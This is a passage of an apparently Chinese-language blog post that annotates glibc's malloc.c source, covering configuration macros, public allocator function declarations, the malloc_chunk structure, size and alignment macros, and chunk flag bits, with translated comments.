class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>这里见名知意，例：tidx2usize —&gt; tcache_idx to unsigned_size</p>
<h2 id="一些设置"><a href="#一些设置" class="headerlink" title="一些设置"></a>一些设置</h2><p>目的：提高项目的可移植性和开启一些优化措施</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  REALLOC_ZERO_BYTES_FREES should be set if a call to</span></span><br><span class="line"><span class="comment">  realloc with zero bytes should be the same as a call to free.</span></span><br><span class="line"><span class="comment">  This is required by the C standard. Otherwise, since this malloc</span></span><br><span class="line"><span class="comment">  returns a unique pointer for malloc(0), so does realloc(p, 0).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//realloc()参数为 0 相当于free</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REALLOC_ZERO_BYTES_FREES 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  TRIM_FASTBINS 控制非常小的内存块的 free() 调用是否可以立即导致内存修剪。</span></span><br><span class="line"><span class="comment">  将其设置为 true (1) 可以减少内存占用，但几乎总是会降低使用大量小块的程序的速度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  仅在您愿意牺牲一些速度以在释放大量小块内存的程序中更积极地减少系统级内存占用时，</span></span><br><span class="line"><span class="comment">  定义此选项。通过将 MXFAST 设置为 0，您可以获得基本相同的效果，但这可能导致</span></span><br><span class="line"><span class="comment">  使用许多小块的程序出现更大的性能下降。 TRIM_FASTBINS 是一个折中的编译时选项，</span></span><br><span class="line"><span class="comment">  它只禁用那些靠近顶部内存的块被放置在快速链表中。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRIM_FASTBINS  0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 从操作系统获取更多内存的定义。 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE         (*__morecore)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE_FAILURE 0</span></span><br><span class="line"><span class="type">void</span> * __default_morecore (<span class="type">ptrdiff_t</span>);</span><br><span class="line"><span class="type">void</span> *(*__morecore)(<span class="type">ptrdiff_t</span>) = __default_morecore;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  与 MORECORE 相关的声明。默认情况下，依赖于 sbrk。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  MORECORE 是从系统获取更多内存的函数名称。有关编写替代 MORECORE 函数的一般指导，</span></span><br><span class="line"><span class="comment">  以及 WIN32 的版本和 pre-OSX macOS 的示例版本，请参见下文。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE sbrk</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  MORECORE_FAILURE 是 MORECORE 和 mmap 失败时返回的值。</span></span><br><span class="line"><span class="comment">  由于它不能是有效的内存地址，并且必须反映标准系统调用的值，</span></span><br><span class="line"><span class="comment">  因此您可能不应该尝试重新定义它。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_FAILURE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE_FAILURE (-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果 MORECORE_CONTIGUOUS 为真，则利用连续调用 MORECORE </span></span><br><span class="line"><span class="comment">  并使用正参数总是返回连续递增地址的事实。 </span></span><br><span class="line"><span class="comment">  这在 UNIX 的 sbrk 中是正确的。即使没有定义，</span></span><br><span class="line"><span class="comment">  当区域恰好是连续的时，malloc 也允许从不同调用中获得的区域跨越分配。</span></span><br><span class="line"><span class="comment">  但是在适用时定义这个可以启用更强的一致性检查和空间效率。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CONTIGUOUS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE_CONTIGUOUS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果您的 MORECORE 版本在给定负参数时无法将空间释放回系统，</span></span><br><span class="line"><span class="comment">  请定义 MORECORE_CANNOT_TRIM。 </span></span><br><span class="line"><span class="comment">  这通常仅在您使用无法处理负参数的手工编写的 MORECORE 函数时是必要的。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* #define MORECORE_CANNOT_TRIM */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  MORECORE_CLEARS (默认 1)</span></span><br><span class="line"><span class="comment">     被映射到 MORECORE 的例程清零内存的程度：</span></span><br><span class="line"><span class="comment">     从不 (0)、仅对新分配的空间 (1) 或总是 (2)。</span></span><br><span class="line"><span class="comment">     (1) 和 (2) 之间的区别是必要的，因为在某些系统上，</span></span><br><span class="line"><span class="comment">     如果应用程序先将断点值递减，然后再增加，</span></span><br><span class="line"><span class="comment">     则重新分配空间的内容是未指定的。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CLEARS</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MORECORE_CLEARS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   MMAP_AS_MORECORE_SIZE 是使用 mmap 作为备份时，如果 sbrk 失败，则使用的最小 mmap 大小参数。</span></span><br><span class="line"><span class="comment">   该值必须是页面大小的倍数。 </span></span><br><span class="line"><span class="comment">   此备份策略通常仅在系统的地址空间中存在“空洞”时适用，</span></span><br><span class="line"><span class="comment">   这样 sbrk 不能执行连续扩展，但系统上仍然有空间可用。</span></span><br><span class="line"><span class="comment">   对于已知对此有用的系统（即大多数 Linux 内核），</span></span><br><span class="line"><span class="comment">   这仅在程序分配大量内存时发生。</span></span><br><span class="line"><span class="comment">   鉴于此，以及 mmap 区域往往有限，大小应该较大，</span></span><br><span class="line"><span class="comment">   以避免过多的 mmap 调用，从而避免耗尽内核资源。 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MMAP_AS_MORECORE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAP_AS_MORECORE_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  定义 HAVE_MREMAP 以使 realloc() 使用 mremap() 重新分配大块内存。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HAVE_MREMAP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HAVE_MREMAP 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 我们可能需要支持 __malloc_initialize_hook 以实现向后兼容性。 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_24)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> HAVE_MALLOC_INIT_HOOK 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> HAVE_MALLOC_INIT_HOOK 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h2 id="一些声明"><a href="#一些声明" class="headerlink" title="一些声明"></a>一些声明</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc()"></a>__libc_malloc()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  这个版本的 malloc 支持标准的 SVID/XPG mallinfo </span></span><br><span class="line"><span class="comment">  函数，该函数返回一个包含使用属性和统计信息的结构体。</span></span><br><span class="line"><span class="comment">  它应该可以在任何符合 SVID/XPG 的系统上工作，该系统在 </span></span><br><span class="line"><span class="comment">  /usr/include/malloc.h 中定义了 struct mallinfo。</span></span><br><span class="line"><span class="comment">  （如果您想自己安装这样的东西，可以根据上面和下面的描述</span></span><br><span class="line"><span class="comment">  删除初步声明，并将其保存到一个 malloc.h 文件中。但实际上</span></span><br><span class="line"><span class="comment">  没有 compelling 的理由去费心去做这件事。）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  主要需要的声明是由 mallinfo() 返回的 mallinfo 结构体。</span></span><br><span class="line"><span class="comment">  SVID/XPG 的 mallinfo 结构体包含了一些在这个版本的 malloc </span></span><br><span class="line"><span class="comment">  中甚至没有意义的字段。这些字段则被 mallinfo() 填充</span></span><br><span class="line"><span class="comment">  为其他可能感兴趣的数字。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------- description of public routines ------------ */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  返回一个指向新分配的至少 n 字节的内存块的指针，如果没有可用空间，则返回 null。</span></span><br><span class="line"><span class="comment">  此外，在失败时，ANSI C 系统上的 errno 被设置为 ENOMEM。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  如果 n 为零，malloc 返回一个最小大小的块。 </span></span><br><span class="line"><span class="comment">  （在大多数 32 位系统上，最小大小为 16 字节，而在 64 位系统上为 24 或 32 字节。）</span></span><br><span class="line"><span class="comment">  在大多数系统上，size_t 是一种无符号类型，因此对于负参数的调用</span></span><br><span class="line"><span class="comment">  被解释为请求巨大的空间，这通常会失败。</span></span><br><span class="line"><span class="comment">  支持的 n 的最大值在各系统之间有所不同，但在任何情况下都小于</span></span><br><span class="line"><span class="comment">  size_t 的最大可表示值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_malloc(<span class="type">size_t</span>);</span><br><span class="line">libc_hidden_proto (__libc_malloc)<span class="comment">//宏，用于隐藏这个函数的实现细节，使其在外部不可见</span></span><br></pre></td></tr></table></figure>

<h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free()"></a>__libc_free()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  free(void* p)</span></span><br><span class="line"><span class="comment">  释放由 p 指向的内存块，该内存块是之前使用 malloc 或相关例程（如 realloc）分配的。</span></span><br><span class="line"><span class="comment">  如果 p 为 null，则没有任何效果。如果 p 已经被释放，则可能会产生任意（即，不良的！）</span></span><br><span class="line"><span class="comment">  效果。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  除非被禁用（使用 mallopt），否则释放非常大的空间时，系统会在可能的情况下</span></span><br><span class="line"><span class="comment">  自动触发将未使用的内存返回给系统的操作，从而减少程序的内存占用。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>     __libc_free(<span class="type">void</span>*);</span><br><span class="line">libc_hidden_proto (__libc_free)<span class="comment">//宏，用于隐藏这个函数的实现细节，使其在外部不可见</span></span><br></pre></td></tr></table></figure>

<h3 id="libc-calloc"><a href="#libc-calloc" class="headerlink" title="__libc_calloc"></a>__libc_calloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  calloc(size_t n_elements, size_t element_size);</span></span><br><span class="line"><span class="comment">  返回指向 n_elements * element_size 字节的指针，并将所有位置设置为零。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_calloc(<span class="type">size_t</span>, <span class="type">size_t</span>);</span><br></pre></td></tr></table></figure>

<h3 id="libc-realloc"><a href="#libc-realloc" class="headerlink" title="__libc_realloc()"></a>__libc_realloc()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  realloc(void* p, size_t n)</span></span><br><span class="line"><span class="comment">  返回一个大小为 n 的内存块指针，该内存块包含与指针 p 相同的数据，直到 (n, p 的大小) 中的最小值字节。如果没有可用空间，则返回 null。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  返回的指针可能与 p 相同，也可能不同。算法优先选择扩展 p，如果不可能，则使用相当于 malloc-copy-free 的序列。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  如果 p 为 null，则 realloc 相当于 malloc。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  如果没有可用空间，realloc 将返回 null，errno 被设置（如果在 ANSI 下），同时 p 不会被释放。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  如果 n 小于 p 当前持有的字节数，新的未使用空间将被截断并在可能的情况下释放。除非定义了 #define REALLOC_ZERO_BYTES_FREES，否则 realloc 的大小参数为零时（重新）分配一个最小大小的块。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  通过 mmap 方式内部获得的大块内存将始终使用 malloc-copy-free 序列扩展，除非系统支持 MREMAP（目前仅限于 Linux）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  不支持旧 Unix realloc 约定，即允许将最后释放的内存块作为 realloc 的参数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_realloc(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">libc_hidden_proto (__libc_realloc)</span><br></pre></td></tr></table></figure>

<h3 id="libc-memalign"><a href="#libc-memalign" class="headerlink" title="__libc_memalign"></a>__libc_memalign</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  memalign(size_t alignment, size_t n);</span></span><br><span class="line"><span class="comment">  返回指向新分配的 n 字节内存块的指针，该内存块的对齐方式符合 alignment 参数的要求。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  alignment 参数应该是 2 的幂。如果参数不是 2 的幂，则使用最近的较大 2 的幂。</span></span><br><span class="line"><span class="comment">  正常的 malloc 调用保证了 8 字节对齐，因此不要使用 8 或更小的参数调用 memalign。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  过度依赖 memalign 会导致内存碎片化。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_memalign(<span class="type">size_t</span>, <span class="type">size_t</span>);</span><br><span class="line">libc_hidden_proto (__libc_memalign)</span><br></pre></td></tr></table></figure>

<h3 id="libc-valloc"><a href="#libc-valloc" class="headerlink" title="__libc_valloc"></a>__libc_valloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  valloc(size_t n);</span></span><br><span class="line"><span class="comment">  等同于 memalign(pagesize, n)，其中 pagesize 是系统的页面大小。</span></span><br><span class="line"><span class="comment">  如果页面大小未知，则使用 4096 字节作为默认值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_valloc(<span class="type">size_t</span>);</span><br></pre></td></tr></table></figure>

<p>跳过，感觉这些没啥意思，跳转978行</p>
<h2 id="DEFAULT-MMAP-MAX"><a href="#DEFAULT-MMAP-MAX" class="headerlink" title="DEFAULT_MMAP_MAX"></a>DEFAULT_MMAP_MAX</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  M_MMAP_MAX 是同时使用 mmap 服务的最大请求数量。</span></span><br><span class="line"><span class="comment">  这个参数存在的原因是，有些系统对 mmap 使用的内部表有数量限制，</span></span><br><span class="line"><span class="comment">  超过一定数量可能会降低性能。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  默认值设置为一个仅作为保护的值。</span></span><br><span class="line"><span class="comment">  将该值设置为 0 会禁用使用 mmap 来处理大请求。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M_MMAP_MAX             -4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MMAP_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_MAX       (65536)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> RETURN_ADDRESS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RETURN_ADDRESS(X_) (NULL)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h2 id="重要函数声明"><a href="#重要函数声明" class="headerlink" title="重要函数声明"></a>重要函数声明</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Forward declarations.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span><span class="comment">//这个指针指向malloc_chunk的头部</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internal routines.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*  _int_malloc(mstate, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>     _int_free(mstate, mchunkptr, <span class="type">int</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*  _int_realloc(mstate, mchunkptr, INTERNAL_SIZE_T,</span><br><span class="line">			   INTERNAL_SIZE_T);</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*  _int_memalign(mstate, <span class="type">size_t</span>, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*  _mid_memalign(<span class="type">size_t</span>, <span class="type">size_t</span>, <span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_printerr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> __<span class="title function_">attribute__</span> <span class="params">((<span class="keyword">noreturn</span>))</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">mem2mem_check</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> sz)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">top_check</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">munmap_chunk</span><span class="params">(mchunkptr p)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MREMAP</span></span><br><span class="line"><span class="type">static</span> mchunkptr <span class="title function_">mremap_chunk</span><span class="params">(mchunkptr p, <span class="type">size_t</span> new_size)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*   <span class="title function_">malloc_check</span><span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>      <span class="title function_">free_check</span><span class="params">(<span class="type">void</span>* mem, <span class="type">const</span> <span class="type">void</span> *caller)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*   <span class="title function_">realloc_check</span><span class="params">(<span class="type">void</span>* oldmem, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">			       <span class="type">const</span> <span class="type">void</span> *caller)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*   <span class="title function_">memalign_check</span><span class="params">(<span class="type">size_t</span> alignment, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">				<span class="type">const</span> <span class="type">void</span> *caller)</span>;</span><br></pre></td></tr></table></figure>

<h2 id="chunk-representations"><a href="#chunk-representations" class="headerlink" title="chunk representations"></a>chunk representations</h2><p>chunk的表示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="chunk的一些计算操作"><a href="#chunk的一些计算操作" class="headerlink" title="chunk的一些计算操作"></a>chunk的一些计算操作</h2><p>mem就是返回给用户的指针，即上面的 fd 的位置</p>
<p>堆地址是由低地址往高地址生长的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ---------- Size and alignment checks and conversions ----------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="comment">//计算最小内存块的大小，即从 struct malloc_chunk 结构体中 fd_nextsize 字段的偏移量。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//定义可以分配的最小内存块的大小。它确保计算出的大小是对齐的，使用 MALLOC_ALIGN_MASK 来进行对齐。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="comment">//判断给定内存块指针 p 是否对齐。如果对齐规则是 2 * SIZE_SZ，则直接使用指针 p，否则使用 chunk2mem(p) 进行转换。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line"><span class="meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span></span><br><span class="line"><span class="meta">   &amp; MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这个内联函数确保请求的大小 req 不会溢出 PTRDIFF_MAX。如果 req 大于 PTRDIFF_MAX，函数返回 false。否则，调用 request2size 计算可用大小，并将结果存储在 sz 中，最后返回 true */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">checked_request2size</span> <span class="params">(<span class="type">size_t</span> req, <span class="type">size_t</span> *sz)</span> __<span class="title function_">nonnull</span> <span class="params">(<span class="number">1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  *sz = request2size (req);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="chunk的物理操作"><a href="#chunk的物理操作" class="headerlink" title="chunk的物理操作"></a>chunk的物理操作</h2><p>即 A M P 哪几个标志位</p>
<p>这里的东西可以在分析代码逻辑时跳转回来看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   --------------- Physical chunk operations ---------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   提取大小时需要屏蔽掉的位</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   注意：IS_MMAPPED 在那些不应看到内存映射块的宏中被故意保留在大小字段中。这会导致在扩展或改编这个 malloc 时，如果不小心尝试访问这些块，会产生有用的核心转储。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 